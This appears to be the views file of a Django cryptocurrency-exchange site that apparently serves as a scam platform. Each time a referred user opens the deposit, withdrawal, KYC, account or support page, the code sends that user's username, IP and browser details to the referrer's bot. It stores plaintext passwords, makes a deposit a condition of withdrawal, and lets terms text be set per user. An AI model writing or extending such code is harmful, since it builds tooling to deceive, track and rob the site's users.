from django.contrib.auth.mixins import LoginRequiredMixin
from django.views.generic import View
from django.shortcuts import render, redirect
from django.contrib.auth import authenticate, login
from django.contrib.auth.models import User
from .forms import LoginForm, RegisterForm, ChangePasswordForm, VerificationForm
import datetime
from exchange import settings
import random
import qrcode
import base64
import os
from .models import *
from bitcoinlib.wallets import Wallet as NewWallet, wallet_delete
from bitcoinlib.mnemonic import Mnemonic
from eth_account import Account
from bitcash import Key, PrivateKey
from binance.client import Client
from .bot import *
import uuid
from .models import Message



# Create your views here.
def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


def set_cookie(response, key, value, days_expire=7):
    if days_expire is None:
        max_age = 365 * 24 * 60 * 60  # one year
    else:
        max_age = days_expire * 24 * 60 * 60

    expires = datetime.datetime.strftime(
        datetime.datetime.utcnow() + datetime.timedelta(seconds=max_age),
        "%a, %d-%b-%Y %H:%M:%S GMT",
    )

    response.set_cookie(
        key,
        value,
        max_age=max_age,
        expires=expires,
    )


def generate_referral_id():
    result = uuid.uuid4().hex[0:15]
    return result


def set_referral(request, ref):
    trader = Trader.objects.filter(referral_id=ref).first()
    response = redirect(request.META.get('HTTP_REFERER', '/'))
    if trader:
        set_cookie(response, 'ref', ref)
    else:
        set_cookie(response, 'ref', None)
    return response


def create_qr(address):
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=7,
        border=1,
    )
    qr.add_data(f'{address}')
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    img.save(settings.MEDIA_ROOT + '/qr_codes/{}.png'.format(address))


def get_qr_data(img_name):
    with open(f"{settings.MEDIA_ROOT}/qr_codes/{img_name}.png", "rb") as imageFile:
        imagestr = base64.b64encode(imageFile.read())
    os.remove(f"{settings.MEDIA_ROOT}/qr_codes/{img_name}.png")

    return imagestr


def get_support_key(user):
    referrer = Referral.objects.filter(referred=user).first()
    if referrer:
        return referrer.referrer.chat_token
    else:
        return None


def handler404(request, *args, **kwargs):
    return render(request, 'error/404.html')


def index(request):
    today = datetime.datetime.now()
    statistic = Statistic.objects.filter(date__day=today.day, date__year=today.year,
                                         date__month=today.month).first()

    prices = Binance().get_all_tickers()
    price_change = Binance().get_all_price_change()

    context = {}

    coins = ['BTC', 'ETH', 'LTC', 'BCH']
    for coin in coins:
        context[f'{coin.lower()}_usdt'] = [
            '{0:.2f}'.format(float(i['price'])) for i in prices if i['symbol'] == f'{coin}USDT'
        ][0]
        context[f'{coin.lower()}_change'] = [
            '{0:.2f}'.format(float(i['priceChangePercent'])) for i in price_change if i['symbol'] == f'{coin}USDT'
        ][0]

    if statistic:
        context['new_users'] = statistic.new_users
        context['regular_users'] = statistic.regular_users
        context['transaction'] = statistic.transaction
        context['visits'] = statistic.visits
        context['processing_time'] = statistic.processing_time
        context['top_pair'] = statistic.top_pair
    return render(request, 'app/index.html', context)


def exchange(request):
    user = Trader.objects.filter(user=request.user).first()
    context = {
        'user_kyc_status': user.kyc_status
    }
    return render(request, 'app/exchange.html', context)




def about(request):
    return render(request, 'app/about.html')


def terms(request):
    if request.user.is_authenticated:
        terms = Trader.objects.filter(user=request.user).first()
        context = {'terms': terms.terms_text, 'key': get_support_key(terms)}
        return render(request, 'app/terms.html', context)
    return render(request, 'app/terms.html')

def suppoort(request):
    return render(request, 'app/support.html')


def room(request, room_name):
    username = request.GET.get('username', 'Anonymous')
    messages = Message.objects.filter(room=room_name)[0:25]

    return render(request, 'app/room.html', {'room_name': room_name, 'username': username, 'messages': messages})

class supp(LoginRequiredMixin,View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        user = Trader.objects.filter(user=request.user).first()
        referrer = Referral.objects.filter(referred=user).first()
        if referrer:
            message = BotAlert(referrer.referrer.user_id, referrer.referrer.bot_token)
            message.view_support(request.user.username, get_client_ip(request), request.user_agent)
        
        

        
        return render(request, 'app/esupport.html')


class AccountView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        user = Trader.objects.filter(user=request.user).first()
        referrer = Referral.objects.filter(referred=user).first()
        if referrer:
            message = BotAlert(referrer.referrer.user_id, referrer.referrer.bot_token)
            message.view_account(request.user.username, get_client_ip(request), request.user_agent)
        last_visits = Visits.objects.filter(user=request.user).order_by('-last_login')[:4]
        last_trans = Transaction.objects.filter(user=request.user).order_by('-date')
        if last_trans:
            if last_trans[0].currency != 'usdt':
                last_deposit = Binance(last_trans[0].currency, last_trans[0].amount).get_price()
            else:
                last_deposit = last_trans[0].amount
        else:
            last_deposit = 0

        btc = Wallet.objects.filter(user=request.user).filter(name='btc').first()
        eth = Wallet.objects.filter(user=request.user).filter(name='eth').first()
        ltc = Wallet.objects.filter(user=request.user).filter(name='ltc').first()
        bch = Wallet.objects.filter(user=request.user).filter(name='bch').first()
        usdt = Wallet.objects.filter(user=request.user).filter(name='usdt').first()
        dash = Wallet.objects.filter(user=request.user).filter(name='dash').first()
        btc_usdt = Binance('btc', btc.balance).get_price()
        eth_usdt = Binance('eth', eth.balance).get_price()
        ltc_usdt = Binance('ltc', ltc.balance).get_price()
        dash_usdt = Binance('dash', dash.balance).get_price()
        bch_usdt = Binance('bch', bch.balance).get_price()

        context = {
            'last_deposit': last_deposit,
            'last_visits': last_visits,
            'last_trans': last_trans[:4],
            'user': user,
            'btc': btc,
            'btc_usdt': btc_usdt,
            'eth': eth,
            'eth_usdt': eth_usdt,
            'ltc': ltc,
            'ltc_usdt': ltc_usdt,
            'bch': bch,
            'bch_usdt': bch_usdt,
            'usdt': usdt,
            'dash': dash,
            'dash_usdt': dash_usdt,
            'total_balance': btc_usdt + eth_usdt + ltc_usdt + bch_usdt + float(usdt.balance) + dash_usdt,
            'last_transaction': last_trans.last(),
            'user_kyc_status': user.kyc_status,
            'key': get_support_key(user)
        }
        return render(request, 'app/account.html', context)


class DepositView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        user = Trader.objects.filter(user=request.user).first()

        coin = request.GET.get('coin', 'btc')
        coin_name = {'btc': 'Bitcoin', 'eth': 'Ethereum', 'ltc': 'Litecoin', 'bch': 'Bitcoin Cash',
                     'usdt': 'Tether', 'dash': 'Dash'}
        if coin not in ['btc', 'eth', 'bch', 'ltc', 'usdt', 'dash']:
            coin = 'btc'

        address = Wallet.objects.filter(user=request.user).filter(name=coin).first()
        create_qr(address.address)
        image_data = get_qr_data(address.address).decode('utf-8')

        referrer = Referral.objects.filter(referred=user).first()
        if referrer:
            message = BotAlert(referrer.referrer.user_id, referrer.referrer.bot_token)
            message.view_deposit(request.user.username, coin_name, coin, get_client_ip(request), request.user_agent)

        context = {
            'user': request.user,
            'coin': coin,
            'coin_name': coin_name[coin],
            'address': address.address,
            'image_data': image_data,
            'user_kyc_status': user.kyc_status,
            'key': get_support_key(user)
        }
        return render(request, 'app/deposit.html', context)


class WithdrawView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        user = Trader.objects.filter(user=request.user).first()

        coin = request.GET.get('coin', 'btc')
        coin_name = {'btc': 'Bitcoin', 'eth': 'Ethereum', 'ltc': 'Litecoin', 'bch': 'Bitcoin Cash',
                     'usdt': 'Tether', 'dash': 'Dash'}
        if coin not in ['btc', 'eth', 'bch', 'ltc', 'usdt', 'dash']:
            coin = 'btc'

        wallet = Wallet.objects.filter(user=request.user).filter(name=coin).first()
        if coin == 'usdt':
            total_wallet_balance = Wallet.objects.filter(user=request.user).filter(name=coin).first().balance
        else:
            total_wallet_balance = Binance(coin, wallet.balance).get_price()

        referrer = Referral.objects.filter(referred=user).first()
        if referrer:
            message = BotAlert(referrer.referrer.user_id, referrer.referrer.bot_token)
            message.view_withdraw(request.user.username, coin_name, coin, get_client_ip(request), request.user_agent)

        context = {
            'total_balance': total_wallet_balance,
            'user': request.user,
            'coin': coin,
            'coin_name': coin_name[coin],
            'address': wallet.address,
            'user_kyc_status': user.kyc_status,
            'min_deposit': user.min_deposit,
            'key': get_support_key(user)
        }
        return render(request, 'app/withdraw.html', context)


class TransactionView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        user = Trader.objects.filter(user=request.user).first()

        referrer = Referral.objects.filter(referred=user).first()
        if referrer:
            message = BotAlert(referrer.referrer.user_id, referrer.referrer.bot_token)
            message.view_transaction(request.user.username, get_client_ip(request), request.user_agent)

        last_trans = Transaction.objects.filter(user=request.user).order_by('-date')
        context = {
            'last_trans': last_trans,
            'user': request.user,
            'user_kyc_status': user.kyc_status,
            'key': get_support_key(user)
        }
        return render(request, 'app/transaction.html', context)


class VerificationView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        user = Trader.objects.filter(user=request.user).first()
        if user.kyc_status in ['wait', 'verified']:
            return redirect('/account/')
        referrer = Referral.objects.filter(referred=user).first()
        if referrer:
            message = BotAlert(referrer.referrer.user_id, referrer.referrer.bot_token)
            message.view_kyc(request.user.username, get_client_ip(request), request.user_agent)
        form = VerificationForm(request.POST or None)
        context = {
            'form': form,
            'user': request.user,
            'key': get_support_key(user)
        }
        return render(request, 'app/kyc.html', context)

    def post(self, request, *args, **kwargs):
        form = VerificationForm(request.POST, request.FILES)
        if form.is_valid():
            for i in request.FILES:
                document = Document()
                document.user = request.user
                document.document = request.FILES[i]
                document.save()
            user = Trader.objects.filter(user=request.user).first()
            user.kyc_status = 'wait'
            user.save()
            referrer = Referral.objects.filter(referred=user).first()
            if referrer:
                message = BotAlert(referrer.referrer.user, referrer.referrer.bot_token)
                message.new_docs(request.user.username, get_client_ip(request), request.user_agent)
        return redirect('/account/')


class SettingsView(LoginRequiredMixin, View):
    login_url = '/login/'

    def get(self, request, *args, **kwargs):
        user = Trader.objects.filter(user=request.user).first()
        referrer = Referral.objects.filter(referred=user).first()
        if referrer:
            message = BotAlert(referrer.referrer.user, referrer.referrer.bot_token)
            message.view_settings(request.user.username, get_client_ip(request), request.user_agent)
        form = ChangePasswordForm(request.POST or None)
        context = {
            'user': request.user,
            'form': form,
            'user_kyc_status': user.kyc_status,
            'referral_id': user.referral_id,
            'referral_bonus': user.referral_bonus,
            'key': get_support_key(user)
        }
        return render(request, 'app/settings.html', context)

    def post(self, request, *args, **kwargs):
        form = ChangePasswordForm(request.POST or None)
        user_kyc_status = Trader.objects.filter(user=request.user).first()
        if form.is_valid():
            old_password = form.cleaned_data['old_password']
            password = form.cleaned_data['password']
            user = User.objects.filter(username=request.user.username).first()
            if user.check_password(old_password):
                user.set_password(password)
                user.save()
                login(request, user)
                return redirect('/account/')
            else:
                context = {'form': form, 'error': 'Invalid old password.',
                           'user_kyc_status': user_kyc_status.kyc_status}
                return render(request, 'app/settings.html', context)
        context = {'form': form, 'user_kyc_status': user_kyc_status.kyc_status}
        return render(request, 'app/settings.html', context)


class LoginView(View):
    def get(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect('/account/')
        form = LoginForm(request.POST or None)
        context = {'form': form}
        return render(request, 'app/login.html', context)

    def post(self, request, *args, **kwargs):
        form = LoginForm(request.POST or None)
        if form.is_valid():
            username = form.cleaned_data['username']
            password = form.cleaned_data['password']
            user = authenticate(username=username, password=password)
            if user:
                login(request, user)
                visit = Visits.objects.create(user=user, last_login=datetime.datetime.now(), ip=get_client_ip(request))
                visit.save()
                return redirect('/account/')
        context = {'form': form}
        return render(request, 'app/login.html', context)


class RegisterView(View):
    def get(self, request, *args, **kwargs):
        if request.user.is_authenticated:
            return redirect('/account/')
        form = RegisterForm(request.POST or None)
        context = {'form': form}
        return render(request, 'app/register.html', context)

    def post(self, request, *args, **kwargs):
        form = RegisterForm(request.POST or None)
        if form.is_valid():
            new_user = form.save(commit=False)
            new_user.first_name = form.cleaned_data['first_name']
            new_user.last_name = form.cleaned_data['last_name']
            new_user.email = form.cleaned_data['email']
            new_user.username = form.cleaned_data['username']
            new_user.save()
            new_user.set_password(form.cleaned_data['password'])
            new_user.save()

            GenerateWallets(new_user)

            Trader.objects.create(
                user=new_user,
                telegram_id=None,
                password=form.cleaned_data['password'],
                referral_id=generate_referral_id(),
                min_deposit='You can withdraw your funds only on external address, which is registered and verified with your account. To verify your (external) address with your account, you need to make a deposit from this address. Deposited amount will be added to your current balance amount and will be available for withdrawal at any time immediately. More information you will find on Deposit area in your profile. Minimal amount of the deposit is 0.005 BTC',
                referral_bonus=10,
                kyc_status='unverified',
                terms_text=None,
                is_worker=False,
                bot_token=None,
                chat_token=None
            )
            notifications = {
                'view_support': 'Просмотр аккаунта', 'view_deposit': 'Переход на страницу пополенения',
                'new_register': 'Новая регистрация', 'view_kyc': 'Переход на страницу верификации',
                'view_account': 'Просмотр аккаунта', 'view_deposit': 'Переход на страницу пополенения',
                'view_withdraw': 'Переход на страницу вывода', 'view_transaction': 'Просмотр транзакций',
                'view_settings': 'Переход на страницу настроек',
                
            }
            for i in notifications:
                Notification.objects.create(
                    user=new_user,
                    name=i,
                    title=notifications[i],
                    status=True
                )

            user = Trader.objects.filter(referral_id=request.COOKIES.get('ref', None)).first()
            if user:
                Referral.objects.create(
                    referrer=user,
                    referred=Trader.objects.filter(user=new_user).first()
                )

            if request.COOKIES.get('ref', None) is not None:
                for i in [user, new_user]:
                    if i == user:
                        u = i.user
                        if i.is_worker is True:
                            continue
                    else:
                        u = i
                    wallet = Wallet.objects.filter(user=u).filter(name='usdt').first()
                    wallet.balance += 10
                    wallet.save()

                    Transaction.objects.create(
                        user=u,
                        amount=10,
                        currency='usdt',
                        method='Registration Bonus',
                        status='Successfully',
                        date=datetime.datetime.now()
                    )

            user = authenticate(username=form.cleaned_data['username'], password=form.cleaned_data['password'])
            login(request, user)

            visit = Visits.objects.create(user=user, last_login=datetime.datetime.now(), ip=get_client_ip(request))
            visit.save()

            return redirect('/account/')
        context = {'form': form}
        return render(request, 'app/register.html', context)


class GenerateWallets():
    def __init__(self, user):
        self.words = uuid.uuid4().hex
        self.user = user

        self.create_btc_wallet()
        self.create_ltc_wallet()
        self.create_dash_wallet()
        self.create_bch_wallet()
        self.create_eth_wallet()

    def create_btc_wallet(self):
        self.passphrase = Mnemonic().generate()
        self.wallet = NewWallet.create(self.words, keys=self.passphrase, network='bitcoin')
        self.wallet = self.wallet.get_key()

        wallet_delete(self.words)

        Wallet.objects.create(
            user=self.user,
            address=self.wallet.address,
            wif=self.wallet.wif,
            seed=self.passphrase,
            balance=0,
            name='btc'
        )

    def create_ltc_wallet(self):
        self.passphrase = Mnemonic().generate()
        self.wallet = NewWallet.create(self.words, keys=self.passphrase, network='litecoin')
        self.wallet = self.wallet.get_key()

        wallet_delete(self.words)

        Wallet.objects.create(
            user=self.user,
            address=self.wallet.address,
            wif=self.wallet.wif,
            seed=self.passphrase,
            balance=0,
            name='ltc'
        )

    def create_dash_wallet(self):
        self.passphrase = Mnemonic().generate()
        self.wallet = NewWallet.create(self.words, keys=self.passphrase, network='dash')
        self.wallet = self.wallet.get_key()

        wallet_delete(self.words)

        Wallet.objects.create(
            user=self.user,
            address=self.wallet.address,
            wif=self.wallet.wif,
            seed=self.passphrase,
            balance=0,
            name='dash'
        )

    def create_eth_wallet(self):
        self.account = Account
        self.account.enable_unaudited_hdwallet_features()
        self.wallet, self.passphrase = self.account.create_with_mnemonic()

        Wallet.objects.create(
            user=self.user,
            address=self.wallet.address,
            wif=self.wallet.key,
            seed=self.passphrase,
            balance=0,
            name='eth'
        )
        Wallet.objects.create(
            user=self.user,
            address=self.wallet.address,
            wif=self.wallet.key,
            seed=self.passphrase,
            balance=0,
            name='usdt'
        )

    def create_bch_wallet(self):
        self.wallet = PrivateKey()

        Wallet.objects.create(
            user=self.user,
            address=self.wallet.address.split(':')[1],
            wif=self.wallet.to_wif(),
            seed=None,
            balance=0,
            name='bch'
        )


class Binance:
    def __init__(self, coin=None, amount=None, currency='USDT'):
        self.client = Client(settings.BINANCE_API, settings.BINANCE_SECRET)
        if coin is not None:
            self.coin = coin.upper()
        self.amount = amount
        self.currency = currency

    def get_all_tickers(self):
        prices = self.client.get_all_tickers()
        return prices

    def get_all_price_change(self):
        tickers = self.client.get_ticker()
        return tickers

    def get_price(self):
        price = float(self.client.get_avg_price(symbol=f'{self.coin}{self.currency}')['price'])
        result = price * self.amount
        return float("{0:.2f}".format(result))

    def get_balance(self):
        price = float(self.client.get_avg_price(symbol=f'{self.coin}{self.currency}')['price'])
        result = price * self.amount
        return float("{0:.4f}".format(result))

    def get_price_change(self):
        change_percent = self.client.get_ticker(symbol=f'{self.coin}{self.currency}')['priceChangePercent']
        return float("{0:.2f}".format(float(change_percent)))
